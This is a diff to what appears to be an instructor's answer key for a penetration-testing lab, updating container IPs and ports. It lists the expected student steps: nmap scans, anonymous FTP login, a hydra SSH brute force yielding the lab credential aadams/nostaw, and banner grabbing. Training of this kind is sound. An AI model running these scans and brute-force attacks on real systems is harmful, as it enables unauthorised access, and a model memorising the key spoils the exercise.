@@ -35,11 +35,12 @@ Host is up (0.000011s latency).
 ```
 
 **Target IPs Discovered:**
-- 172.20.0.3 - Web server
-- 172.20.0.4 - SSH server  
-- 172.20.0.5 - FTP server
-- 172.20.0.6 - SMTP server
-- 172.20.0.7 - Mail server
+- 172.20.0.2 - SMTP server (MailHog)
+- 172.20.0.3 - SSH server  
+- 172.20.0.4 - FTP server
+- 172.20.0.5 - Web server
+- 172.20.0.6 - Mail server (Dovecot POP3/IMAP)
+- 172.20.0.7 - Attacker machine (Kali)
 
 ## Phase 1: Reconnaissance (Expected Student Results)
 
@@ -49,19 +50,19 @@ Host is up (0.000011s latency).
 nmap -sn 172.20.0.0/24
 
 # Step 2: Port scan discovered targets
-nmap -sC -sV 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6 172.20.0.7
+nmap -sC -sV 172.20.0.2 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6
 ```
 
 **Expected Ports Discovered:**
-- 172.20.0.3: 80/tcp (HTTP - Apache)
-- 172.20.0.4: 2222/tcp (SSH - OpenSSH)
-- 172.20.0.5: 21/tcp (FTP - vsftpd), 20/tcp (FTP-data)
-- 172.20.0.6: 1025/tcp (SMTP - MailHog), 8025/tcp (HTTP - MailHog Web UI)
-- 172.20.0.7: 110/tcp (POP3 - Dovecot), 143/tcp (IMAP - Dovecot)
+- 172.20.0.2: 1025/tcp (SMTP - MailHog), 8025/tcp (HTTP - MailHog Web UI)
+- 172.20.0.3: 22/tcp (SSH - OpenSSH)
+- 172.20.0.4: 21/tcp (FTP - vsftpd)
+- 172.20.0.5: 80/tcp (HTTP - Apache)
+- 172.20.0.6: 110/tcp (POP3 - Dovecot), 143/tcp (IMAP - Dovecot)
 
 ### Web Enumeration
 ```bash
-curl http://172.20.0.3
+curl http://172.20.0.5
 ```
 
 **Expected Findings:**
@@ -76,9 +77,9 @@ Students should extract these employee names and emails:
 
 ### FTP Service Investigation
 ```bash
-ftp 172.20.0.5
+ftp 172.20.0.4
 # Username: anonymous
-# Password: anonymous (or just press Enter)
+# Password: (just press Enter)
 
 ftp> ls
 ftp> cd incoming
@@ -92,7 +93,7 @@ ftp> quit
 
 ### SSH Service Banner
 ```bash
-ssh -p 2222 172.20.0.4
+ssh 172.20.0.3
 ```
 
 **Expected Banner:** OpenSSH server accepting password authentication
@@ -130,17 +131,17 @@ EOF
 
 ### SSH Brute Force Attack
 ```bash
-hydra -L users.txt -P passwords.txt 172.20.0.4 ssh -s 2222 -t 4
+hydra -L users.txt -P passwords.txt 172.20.0.3 ssh -t 4
 ```
 
 **Expected Successful Credential:**
 ```
-[2222][ssh] host: 172.20.0.4   login: aadams   password: nostaw
+[22][ssh] host: 172.20.0.3   login: aadams   password: nostaw
 ```
 
 ### SSH Access and Exploration
 ```bash
-ssh -p 2222 aadams@172.20.0.4
+ssh aadams@172.20.0.3
 # Password: nostaw
 
 # Once inside:
@@ -191,16 +192,16 @@ Students should notice that `nostaw` is `watson` backwards, suggesting:
 ### Additional Service Enumeration
 ```bash
 # SMTP Banner
-telnet 172.20.0.6 1025
+telnet 172.20.0.2 1025
 # Type: EHLO test
 # Expected: MailHog SMTP server response
 
 # POP3 Banner  
-telnet 172.20.0.7 110
+telnet 172.20.0.6 110
 # Expected: Dovecot POP3 server ready
 
 # IMAP Banner
-telnet 172.20.0.7 143  
+telnet 172.20.0.6 143  
 # Expected: Dovecot IMAP server ready
 ```
 
